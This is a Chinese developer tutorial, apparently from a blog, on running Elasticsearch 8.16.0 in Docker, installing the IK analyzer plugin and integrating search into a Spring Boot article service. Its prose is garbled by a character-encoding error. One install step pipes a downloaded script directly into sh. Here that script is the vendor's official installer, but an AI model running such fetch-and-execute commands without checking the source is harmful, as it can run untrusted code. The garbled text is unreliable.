(max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç¤ºä¾‹é‡‡ç”¨ Spring Boot 3.0.7ã€ ElasticSearch 8.16.0ï¼Œå…¶ä¸­ es ä¸ºæœ¬åœ°é…ç½®çš„å•æœºæœåŠ¡</p>
<h3 data-id="heading-0">1. ä¸‹è½½ ElastiSearch</h3>
<p>å®˜æ–¹ GitHub ä¸Šç›®å‰åªæœ‰æºç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch" target="_blank" title="https://github.com/elastic/elasticsearch" ref="nofollow noopener noreferrer">github.com/elastic/elaâ€¦</a>ï¼Œå¹¶æ²¡æœ‰å‘å¸ƒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤æ¨èä½¿ç”¨ docker æ¥ä¸‹è½½ã€‚</p>
<p>å®˜æ–¹æä¾›äº†ä¸€ä¸ª docker ä¸‹è½½çš„è„šæœ¬ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Fstart-local" target="_blank" title="https://github.com/elastic/start-local" ref="nofollow noopener noreferrer">github.com/elastic/staâ€¦</a></p>
<p>è¿™é‡Œç®€å•è¿›è¡Œä»‹ç»ä¸€ä¸‹ï¼š</p>
<h4 data-id="heading-1">1.1. ç³»ç»Ÿè¦æ±‚</h4>
<ul>
<li>æ”¯æŒ Windowsï¼ˆéœ€ä¸‹è½½ WSL2ï¼‰ã€Linuxã€macOS</li>
<li>éœ€è¦æœ‰ docker</li>
<li>éœ€è¦è‡³å°‘ 5GB çš„ç¡¬ç›˜ç©ºé—´</li>
</ul>
<p>å…¶ä¸­ Windows å’Œ macOS æ¨èä¸‹è½½ docker-desktopï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.docker.com%2Fproducts%2Fdocker-desktop%2F" target="_blank" title="https://www.docker.com/products/docker-desktop/" ref="nofollow noopener noreferrer">www.docker.com/products/doâ€¦</a></p>
<h4 data-id="heading-2">1.2. å®‰è£…</h4>
<p>ç»ˆç«¯é‡Œè¾“å…¥ä¸€ä¸‹å‘½ä»¤ï¼ˆéœ€ç¡®ä¿docker-desktopå¯åŠ¨ï¼‰ï¼Œå¯æŒ‡å®šç‰ˆæœ¬</p>
<pre><code class="hljs language-sql" lang="sql">curl <span class="hljs-operator">-</span>fsSL https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>elastic.co<span class="hljs-operator">/</span><span class="hljs-keyword">start</span><span class="hljs-operator">-</span><span class="hljs-keyword">local</span> <span class="hljs-operator">|</span> sh <span class="hljs-operator">-</span>s <span class="hljs-comment">-- -v 8.16.0</span>
</code></pre>
<ul>
<li>è¯¥å‘½ä»¤ä¼šä¸‹è½½è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ›å»º<code>elastic-start-local/</code> ç›®å½•ï¼Œä»¥åŠåœ¨ç›®å½•é‡Œç”Ÿæˆå¿…è¦çš„é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚.envã€docker-compose.ymlï¼Œè¿˜ä¼šè‡ªåŠ¨æ‹‰å–å®˜æ–¹é•œåƒå¹¶å¯åŠ¨å®¹å™¨ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53d521aa4d29499cb442a34fbd70bda5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29tZWhvdzAwNw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214779&amp;x-signature=FAJurrfuJtrvMLhXBkJCR0VOhxY%3D" alt="" loading="lazy"/></p>
<ul>
<li>ä¼šåŒ…å« Elastic ä¼ä¸šç‰ˆ30å¤©ä½¿ç”¨è®¸å¯è¯ï¼Œ30å¤©åè‡ªåŠ¨é™çº§ä¸ºBasicï¼ˆå…è´¹å¼€æºç‰ˆï¼‰</li>
<li>è¿˜ä¼šè®¾ç½®å®‰å…¨è®¿é—®å’Œæ§åˆ¶</li>
</ul>

<ul>
<li>
<ul>
<li>è‡ªåŠ¨ç”Ÿæˆå¼ºå¯†ç ï¼ˆå­˜å‚¨åœ¨.envæ–‡ä»¶ï¼Œæ³¨æ„ï¼Œå¦‚æœéœ€è¦æ›´æ”¹å¯†ç ï¼Œåœ¨.envé‡Œæ›´æ”¹æ˜¯ä¸ä¼šç”Ÿæ•ˆçš„ï¼Œéœ€è¦åˆ°dockeré‡Œesçš„å®¹å™¨ä¸­å»æ›´æ”¹ï¼‰</li>
<li>è‡ªåŠ¨ç”Ÿæˆ <strong>API Key</strong></li>
<li><strong>ä»…ç»‘å®š localhost</strong></li>
<li><strong>ç¦ç”¨ HTTPS</strong>ï¼ˆä»… HTTP + Basic Authï¼‰ï¼Œé€‚åˆæœ¬åœ°è°ƒè¯•ã€‚</li>
</ul>
</li>
</ul>

<ul>
<li>è¯¥è„šæœ¬çš„å…¶ä»–è¯¦ç»†ç‰¹æ€§å¯è‡ªè¡Œå»å®˜ç½‘æŸ¥çœ‹ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58f6a918aaba409db04e518dc9d858b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29tZWhvdzAwNw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214779&amp;x-signature=T7LkC2Xkp8DYc3Vshny3wr0S%2BjE%3D" alt="" loading="lazy"/></p>
<p>å®‰è£…æˆåŠŸçš„é¡µé¢</p>
<p>elastic-searchç«¯å£åœ¨9200ï¼Œkibanaï¼ˆeså¯è§†åŒ–æ§åˆ¶å°ï¼‰åœ¨5601</p>
<h4 data-id="heading-3">1.3. å®‰è£… ik ä¸­æ–‡åˆ†è¯å™¨</h4>
<p><strong>ElasticSearch é»˜è®¤çš„åˆ†è¯å™¨å¯¹ä¸­æ–‡æ”¯æŒå¾ˆå·®</strong>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å®‰è£…ä¸“é—¨çš„ä¸­æ–‡åˆ†è¯å™¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Finfinilabs%2Fanalysis-ik%2Fblob%2Fmaster%2FREADME.md" target="_blank" title="https://github.com/infinilabs/analysis-ik/blob/master/README.md" ref="nofollow noopener noreferrer">github.com/infinilabs/â€¦</a></p>
<p>æˆ‘ä»¬éœ€è¦åœ¨ docker ä¸­æ‰“å¼€ elasticsearch çš„å®¹å™¨ï¼ˆä¸€èˆ¬å«åš <strong>es-local-dev</strong>ï¼‰ï¼Œç„¶åå°† ik åˆ†è¯å™¨å®‰è£…è‡³ bin/elasticsearch-plugin ç›®å½•ã€‚</p>
<p>å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">bin/elasticsearch-plugin install https://get.infini.cloud/elasticsearch/analysis-ik/8.16.0
</code></pre>
<p>å¦‚æœä½ ä¸‹è½½äº†docker execï¼Œå¯ä»¥æ›´ä¾¿æ·çš„é€šè¿‡å¯è§†åŒ–è¿›å…¥å®¹å™¨ä¸­</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8aa89d113094c81960fe57d9e351e7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29tZWhvdzAwNw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214779&amp;x-signature=zk%2FKVBWQr6Nw3gh6ke6fZCHYiAc%3D" alt="" loading="lazy"/></p>
<p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç‚¹å‡» es-local-devï¼Œç„¶åå†é€‰æ‹© exec</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffe92ac538b34404a68b9d2f19b23d16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29tZWhvdzAwNw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214779&amp;x-signature=aGOaqO5wyW7xXorMeVGoF5EURyw%3D" alt="" loading="lazy"/></p>
<p>æ­¤æ—¶å°±å¯ä»¥åœ¨è¿™é‡Œçš„ç»ˆç«¯è¾“å…¥ä¸Šè¿°çš„å®‰è£…å‘½ä»¤ã€‚</p>
<p>æœ€åï¼Œæˆ‘ä»¬åœ¨ç»ˆç«¯é‡Œè¾“å…¥</p>
<pre><code class="hljs language-bash" lang="bash">bin/elasticsearch-plugin list
</code></pre>
<p>å¦‚æœå‡ºç° analysis-ikï¼Œå°±å®Œæˆäº†ä¸‹è½½ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99d42f0bc8294741ad6b9f9358766a8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29tZWhvdzAwNw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214779&amp;x-signature=USJkcj36ygnDbQ%2BVDe8pTjcgFco%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2. ä½¿ç”¨ç¤ºä¾‹</h3>
<h4 data-id="heading-5">2.1. é¦–å…ˆå¯¼å…¥ä¾èµ–</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ElasticSearch --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ä¸éœ€è¦æŒ‡å®šç‰ˆæœ¬ï¼Œä¸€èˆ¬ Spring Boot é¡¹ç›®ä¼šç»§æ‰¿ Spring Boot Starter Parentï¼Œæˆ–è€…ä½¿ç”¨ dependencyManagementã€‚å¦‚æœéƒ½æ²¡æœ‰ï¼Œç‰ˆæœ¬å·æŒ‡å®šä¸º Spring Boot çš„ç‰ˆæœ¬å·å³å¯ã€‚</p>
<h4 data-id="heading-6">2.2. é…ç½® application.yaml</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">data:</span>
    <span class="hljs-attr">elasticsearch:</span>
      <span class="hljs-attr">repositories:</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span> <span class="hljs-string">//</span> <span class="hljs-string">å¯ç”¨</span> <span class="hljs-string">Spring</span> <span class="hljs-string">Data</span> <span class="hljs-string">Elasticsearch</span> <span class="hljs-string">çš„</span> <span class="hljs-string">Repository</span> <span class="hljs-string">è‡ªåŠ¨ä»£ç†åŠŸèƒ½</span>
  <span class="hljs-attr">elasticsearch:</span>
    <span class="hljs-attr">uris:</span> <span class="hljs-string">http://localhost:9200</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">elastic</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">ä½ çš„å¯†ç </span>
</code></pre>
<h4 data-id="heading-7">2.3. åˆ›å»ºæ–‡æ¡£å®ä½“ï¼ˆES æ–‡æ¡£æ˜ å°„ç±»ï¼‰</h4>
<p>æ ¹æ®ä½ è¦æœç´¢çš„å†…å®¹ï¼Œåˆ›å»ºæ–‡æ¡£å®ä½“</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Builder;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;
<span class="hljs-keyword">import</span> org.springframework.<span class="hljs-keyword">data</span>.<span class="hljs-keyword">annotation</span>.Id;
<span class="hljs-keyword">import</span> org.springframework.<span class="hljs-keyword">data</span>.elasticsearch.annotations.Document;
<span class="hljs-keyword">import</span> org.springframework.<span class="hljs-keyword">data</span>.elasticsearch.annotations.Field;
<span class="hljs-keyword">import</span> org.springframework.<span class="hljs-keyword">data</span>.elasticsearch.annotations.FieldType;

<span class="hljs-keyword">import</span> java.util.Date;

<span class="hljs-comment">/**
 * ElasticSearch æ–‡æ¡£å®ä½“ç±» | åšå®¢æ–‡ç« 
 */</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Builder</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@Document(indexName = <span class="hljs-string">"blog_articles"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArticleDocument</span> {

    <span class="hljs-comment">/**
     * æ–‡æ¡£å”¯ä¸€æ ‡è¯†
     */</span>
    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;

    <span class="hljs-comment">/**
     * æ–‡ç« æ ‡é¢˜
     * è¿™é‡Œé‡‡ç”¨ikåˆ†è¯å™¨
     * ik_smartç”¨äºå»ºç´¢å¼•æ—¶ç²—ç²’åº¦åˆ†è¯èŠ‚çœç©ºé—´ï¼Œik_max_wordç”¨äºæœç´¢æ—¶ç»†ç²’åº¦åˆ†è¯æé«˜å¬å›ç‡ã€‚
     */</span>
    <span class="hljs-meta">@Field(type = FieldType.Text, analyzer = <span class="hljs-string">"ik_smart"</span>, searchAnalyzer = <span class="hljs-string">"ik_max_word"</span>)</span>
    <span class="hljs-keyword">private</span> String title;

    <span class="hljs-comment">/**
     * æ–‡ç« å†…å®¹
     */</span>
    <span class="hljs-meta">@Field(type = FieldType.Text, analyzer = <span class="hljs-string">"ik_smart"</span>, searchAnalyzer = <span class="hljs-string">"ik_max_word"</span>)</span>
    <span class="hljs-keyword">private</span> String content;

    <span class="hljs-comment">/**
     * ä½œè€…id
     */</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span> <span class="hljs-comment">// ä¸åˆ†è¯ï¼Œç”¨äºç²¾ç¡®åŒ¹é…</span>
    <span class="hljs-keyword">private</span> String authorId;

    <span class="hljs-comment">/**
     * åˆ›å»ºæ—¶é—´
     */</span>
    <span class="hljs-meta">@Field(type = FieldType.Date)</span>
    <span class="hljs-keyword">private</span> Date createTime;
}
</code></pre>
<h4 data-id="heading-8">2.4. åˆ›å»º Respositoryï¼šES çš„æ“ä½œæ¥å£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> io.github.somehow.mysite.dao.mapper;

<span class="hljs-keyword">import</span> io.github.somehow.mysite.elasticsearch.ArticleDocument;
<span class="hljs-keyword">import</span> org.springframework.data.domain.Page;
<span class="hljs-keyword">import</span> org.springframework.data.domain.Pageable;
<span class="hljs-keyword">import</span> org.springframework.data.elasticsearch.repository.ElasticsearchRepository;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * Elasticsearch æŒä¹…å±‚ | åšå®¢æ–‡ç« 
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ArticleEsRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ElasticsearchRepository</span>&lt;ArticleDocument, String&gt; {

    <span class="hljs-comment">/**
     * æ ¹æ®æ ‡é¢˜æœç´¢æ–‡ç« 
     *
     * <span class="hljs-doctag">@param</span> title æ ‡é¢˜å…³é”®è¯
     * <span class="hljs-doctag">@param</span> pageable åˆ†é¡µå‚æ•°
     * <span class="hljs-doctag">@return</span> æ–‡ç« åˆ†é¡µç»“æœ
     */</span>
    Page&lt;ArticleDocument&gt; <span class="hljs-title function_">findByTitleContaining</span><span class="hljs-params">(String title, Pageable pageable)</span>;

    <span class="hljs-comment">/**
     * æ ¹æ®å†…å®¹æœç´¢æ–‡ç« 
     *
     * <span class="hljs-doctag">@param</span> content å†…å®¹å…³é”®è¯
     * <span class="hljs-doctag">@param</span> pageable åˆ†é¡µå‚æ•°
     * <span class="hljs-doctag">@return</span> æ–‡ç« åˆ†é¡µç»“æœ
     */</span>
    Page&lt;ArticleDocument&gt; <span class="hljs-title function_">findByContentContaining</span><span class="hljs-params">(String content, Pageable pageable)</span>;

    <span class="hljs-comment">/**
     * æ ¹æ®ä½œè€…IDåˆ—è¡¨æœç´¢æ–‡ç« 
     *
     * <span class="hljs-doctag">@param</span> authorIds ä½œè€…IDåˆ—è¡¨
     * <span class="hljs-doctag">@param</span> pageable åˆ†é¡µå‚æ•°
     * <span class="hljs-doctag">@return</span> æ–‡ç« åˆ†é¡µç»“æœ
     */</span>
    Page&lt;ArticleDocument&gt; <span class="hljs-title function_">findByAuthorIdIn</span><span class="hljs-params">(List&lt;String&gt; authorIds, Pageable pageable)</span>;
}
</code></pre>
<ul>
<li>è¿™é‡Œå®šä¹‰çš„æ–¹æ³•ä¸éœ€è¦å»å®ç°ï¼Œè¿™æ˜¯ <strong>Spring Data çš„ Repository åŠ¨æ€ä»£ç†æœºåˆ¶</strong>ï¼Œ<strong>Spring åœ¨å¯åŠ¨æ—¶ä¼šæ ¹æ®æ–¹æ³•åè‡ªåŠ¨ç”ŸæˆæŸ¥è¯¢å®ç°</strong>ï¼Œå› æ­¤æ— éœ€æ‰‹åŠ¨ç¼–å†™ä»£ç ã€‚</li>
<li>æ³¨æ„ï¼Œæ­¤å¤„çš„ <strong>Page</strong> æ˜¯ <strong>org.springframework.data.domain.Page</strong>ï¼Œå¦‚æœä½ ä½¿ç”¨äº† Mybatis-Plusï¼Œéœ€è¦æ³¨æ„å’ŒMybatis-Plus çš„ Page åŒºåˆ«å¼€ã€‚</li>
<li>psï¼šåº•å±‚ ES æŸ¥è¯¢å¹¶ä¸å¼ºåˆ¶åˆ†é¡µï¼›ä¸è¿‡ï¼Œ<strong>Repository</strong> æ¥å£æ–¹æ³•å¦‚æœè¿”å› <strong>Page</strong> ç±»å‹ï¼Œä¼š<strong>è‡ªåŠ¨è¿›è¡Œåˆ†é¡µ</strong>å¤„ç†ï¼Œè¿™æ˜¯<strong>æ¡†æ¶å±‚é¢çš„å°è£…ã€‚</strong></li>
</ul>
<h4 data-id="heading-9">2.5. åœ¨ Service ä¸šåŠ¡é€»è¾‘å±‚ç¼–å†™ ES çš„ç›¸å…³é€»è¾‘</h4>
<pre><code class="hljs language-ini" lang="ini">import cn.hutool.core.bean.BeanUtil<span class="hljs-comment">;</span>
import cn.hutool.core.util.IdUtil<span class="hljs-comment">;</span>
import cn.hutool.core.util.StrUtil<span class="hljs-comment">;</span>
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper<span class="hljs-comment">;</span>
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper<span class="hljs-comment">;</span>
import com.baomidou.mybatisplus.core.metadata.IPage<span class="hljs-comment">;</span>
import com.baomidou.mybatisplus.core.toolkit.Wrappers<span class="hljs-comment">;</span>
import com.baomidou.mybatisplus.extension.plugins.pagination.Page<span class="hljs-comment">;</span>
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl<span class="hljs-comment">;</span>
import com.baomidou.mybatisplus.extension.toolkit.SqlHelper<span class="hljs-comment">;</span>
import io.github.somehow.mysite.commons.framework.exception.ClientException<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dao.entity.ArticleDO<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dao.entity.UserDO<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dao.entity.UserFavoriteArticleDO<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dao.mapper.ArticleEsRepository<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dao.mapper.ArticleMapper<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dao.mapper.UserFavoriteArticleMapper<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dao.mapper.UserMapper<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dto.req.article.*<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dto.resp.ArticlePageQueryRespDTO<span class="hljs-comment">;</span>
import io.github.somehow.mysite.dto.resp.ArticleSelectRespDTO<span class="hljs-comment">;</span>
import io.github.somehow.mysite.elasticsearch.ArticleDocument<span class="hljs-comment">;</span>
import io.github.somehow.mysite.service.ArticleService<span class="hljs-comment">;</span>
import lombok.RequiredArgsConstructor<span class="hljs-comment">;</span>
import lombok.extern.slf4j.Slf4j<span class="hljs-comment">;</span>
import org.springframework.dao.DuplicateKeyException<span class="hljs-comment">;</span>
import org.springframework.data.domain.PageRequest<span class="hljs-comment">;</span>
import org.springframework.stereotype.Service<span class="hljs-comment">;</span>
import org.springframework.transaction.annotation.Transactional<span class="hljs-comment">;</span>
import org.springframework.util.CollectionUtils<span class="hljs-comment">;</span>

import java.util.Collections<span class="hljs-comment">;</span>
import java.util.List<span class="hljs-comment">;</span>
import java.util.Objects<span class="hljs-comment">;</span>
import java.util.stream.Collectors<span class="hljs-comment">;</span>

/**
 * æ–‡ç« ä¸šåŠ¡é€»è¾‘å®ç°å±‚
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class ArticleServiceImpl extends ServiceImpl&lt;ArticleMapper, ArticleDO&gt; implements ArticleService {

    private final ArticleEsRepository esRepository<span class="hljs-comment">;</span>
    private final UserMapper userMapper<span class="hljs-comment">;</span>

    @Override
    @Transactional
    public void createArticle(ArticleCreateReqDTO requestParam) {

        // ç•¥ï¼Œæ­¤å¤„ä¸ºæ–‡ç« åˆ›å»ºé€»è¾‘ï¼Œå¹¶å¡«å…¥æ•°æ®åº“
        articleMapper.insert(articleDO)<span class="hljs-comment">;</span>

        // éœ€è¦å°†æ•°æ®åŒæ­¥åˆ° ElasticSearch ä¸­
        ArticleDocument <span class="hljs-attr">doc</span> = ArticleDocument.builder()
                .id(articleDO.getId().toString())
                .title(requestParam.getTitle())
                .content(requestParam.getContent())
                .authorId(articleDO.getAuthorId().toString())
                .createTime(articleDO.getCreateTime())
                .build()<span class="hljs-comment">;</span>
        esRepository.save(doc)<span class="hljs-comment">;</span>
    }

    @Override
    public void updateArticle(ArticleUpdateReqDTO requestParam) {

        // ç•¥ï¼Œæ­¤å¤„ä¸ºæ›´æ–°æ“ä½œ
        baseMapper.update(updateWrapper)<span class="hljs-comment">;</span>

        // æ›´æ–°ESä¸­çš„æ–‡æ¡£
        ArticleDO <span class="hljs-attr">updatedArticle</span> = baseMapper.selectOne(Wrappers.lambdaQuery(ArticleDO.class)
                .eq(ArticleDO::getId, requestParam.getId())
                .eq(ArticleDO::getDelFlag, 0))<span class="hljs-comment">;</span>
        
        if (updatedArticle != null) {
            ArticleDocument <span class="hljs-attr">articleDocument</span> = ArticleDocument.builder()
                    .id(updatedArticle.getId().toString())
                    .title(updatedArticle.getTitle())
                    .content(updatedArticle.getContent())
                    .authorId(updatedArticle.getAuthorId().toString())
                    .createTime(updatedArticle.getCreateTime())
                    .build()<span class="hljs-comment">;</span>

            esRepository.save(articleDocument)<span class="hljs-comment">;</span>
        }
    }

    @Override
    public void deleteArticle(Long id) {

        // ç•¥ï¼Œæ­¤å¤„ä¸ºåˆ é™¤é€»è¾‘
        articleDO.setDelFlag(1)<span class="hljs-comment">;</span>
        baseMapper.update(articleDO, updateWrapper)<span class="hljs-comment">;</span>

        // åˆ é™¤åŒæ­¥åˆ° ES
        esRepository.deleteById(id.toString())<span class="hljs-comment">;</span>
    }

    @Override
    public IPage&lt;ArticlePageQueryRespDTO&gt; pageQueryArticle(ArticlePageQueryReqDTO requestParam) {
        // æ„å»ºESåˆ†é¡µå‚æ•°
        PageRequest <span class="hljs-attr">pageRequest</span> = PageRequest.of(
                (int) (requestParam.getCurrent() - 1), 
                (int) requestParam.getSize())<span class="hljs-comment">;</span>
        
        // è·å–æœç´¢å…³é”®è¯
        String <span class="hljs-attr">keyword</span> = StrUtil.blankToDefault(requestParam.getKeyword(), <span class="hljs-string">""</span>)<span class="hljs-comment">;</span>
        
        // è·å–æœç´¢ç±»å‹ï¼Œé»˜è®¤æŒ‰æ ‡é¢˜æœç´¢
        String <span class="hljs-attr">searchType</span> = StrUtil.blankToDefault(requestParam.getSearchType(), <span class="hljs-string">"title"</span>)<span class="hljs-comment">;</span>
        
        org.springframework.data.domain.Page&lt;ArticleDocument&gt; esPage<span class="hljs-comment">;</span>
        switch (searchType) {
            case "title":
                // æŒ‰æ ‡é¢˜æœç´¢
                <span class="hljs-attr">esPage</span> = esRepository.findByTitleContaining(keyword, pageRequest)<span class="hljs-comment">;</span>
                break<span class="hljs-comment">;</span>
            case "content":
                // æŒ‰å†…å®¹æœç´¢
                <span class="hljs-attr">esPage</span> = esRepository.findByContentContaining(keyword, pageRequest)<span class="hljs-comment">;</span>
                break<span class="hljs-comment">;</span>
            case "author":
                // æŒ‰ä½œè€…æœç´¢
                List&lt;UserDO&gt; <span class="hljs-attr">matchedUsers</span> = userMapper.selectByUsernameLike(keyword)<span class="hljs-comment">;</span>
                if (!CollectionUtils.isEmpty(matchedUsers)) {
                    List&lt;String&gt; <span class="hljs-attr">authorIds</span> = matchedUsers.stream()
                            .map(user -&gt; user.getId().toString())
                            .collect(Collectors.toList())<span class="hljs-comment">;</span>
                    <span class="hljs-attr">esPage</span> = esRepository.findByAuthorIdIn(authorIds, pageRequest)<span class="hljs-comment">;</span>
                } else {
                    // æ²¡æœ‰åŒ¹é…çš„ç”¨æˆ·ï¼Œè¿”å›ç©ºç»“æœ
                    return new Page&lt;&gt;()<span class="hljs-comment">;</span>
                }
                break<span class="hljs-comment">;</span>
            default:
                // é»˜è®¤æŒ‰æ ‡é¢˜æœç´¢
                <span class="hljs-attr">esPage</span> = esRepository.findByTitleContaining(keyword, pageRequest)<span class="hljs-comment">;</span>
                break<span class="hljs-comment">;</span>
        }
        
        // å°†ESæŸ¥è¯¢ç»“æœè½¬æ¢ä¸ºéœ€è¦çš„DTOæ ¼å¼
        if (esPage.hasContent()) {
            List&lt;Long&gt; <span class="hljs-attr">articleIds</span> = esPage.getContent().stream()
                    .map(doc -&gt; Long.valueOf(doc.getId()))
                    .collect(Collectors.toList())<span class="hljs-comment">;</span>
                    
            // ä»æ•°æ®åº“è·å–å®Œæ•´æ–‡ç« ä¿¡æ¯
            List&lt;ArticleDO&gt; <span class="hljs-attr">articles</span> = baseMapper.selectList(Wrappers.&lt;ArticleDO&gt;lambdaQuery()
                    .in(ArticleDO::getId, articleIds)
                    .eq(ArticleDO::getDelFlag, 0))<span class="hljs-comment">;</span>
            
            // è·å–ä½œè€…ä¿¡æ¯
            List&lt;Long&gt; <span class="hljs-attr">authorIds</span> = articles.stream()
                    .map(ArticleDO::getAuthorId)
                    .distinct()
                    .collect(Collectors.toList())<span class="hljs-comment">;</span>
            
            List&lt;UserDO&gt; <span class="hljs-attr">authors</span> = userMapper.selectList(Wrappers.&lt;UserDO&gt;lambdaQuery()
                    .in(UserDO::getId, authorIds))<span class="hljs-comment">;</span>
            
            // æ„å»ºè¿”å›ç»“æœ
            List&lt;ArticlePageQueryRespDTO&gt; <span class="hljs-attr">records</span> = articles.stream()
                    .map(article -&gt; {
                        ArticlePageQueryRespDTO <span class="hljs-attr">dto</span> = new ArticlePageQueryRespDTO()<span class="hljs-comment">;</span>
                        dto.setId(article.getId())<span class="hljs-comment">;</span>
                        dto.setTitle(article.getTitle())<span class="hljs-comment">;</span>
                        dto.setSummary(article.getSummary())<span class="hljs-comment">;</span>
                        dto.setViewCount(article.getViewCount())<span class="hljs-comment">;</span>
                        dto.setFavoriteCount(article.getFavoriteCount())<span class="hljs-comment">;</span>
                        
                        // è®¾ç½®ä½œè€…åç§°
                        String <span class="hljs-attr">authorName</span> = authors.stream()
                                .filter(user -&gt; user.getId().equals(article.getAuthorId()))
                                .map(UserDO::getUsername)
                                .findFirst()
                                .orElse("")<span class="hljs-comment">;</span>
                        dto.setAuthorName(authorName)<span class="hljs-comment">;</span>
                        
                        return dto<span class="hljs-comment">;</span>
                    })
                    .collect(Collectors.toList())<span class="hljs-comment">;</span>
            
            // æ„é€ MyBatis Plusåˆ†é¡µå¯¹è±¡
            IPage&lt;ArticlePageQueryRespDTO&gt; <span class="hljs-attr">result</span> = new Page&lt;&gt;(requestParam.getCurrent(), requestParam.getSize(), esPage.getTotalElements())<span class="hljs-comment">;</span>
            result.setRecords(records)<span class="hljs-comment">;</span>
            return result<span class="hljs-comment">;</span>
        } else {
            return new Page&lt;&gt;()<span class="hljs-comment">;</span>
        }
    }

}
</code></pre>
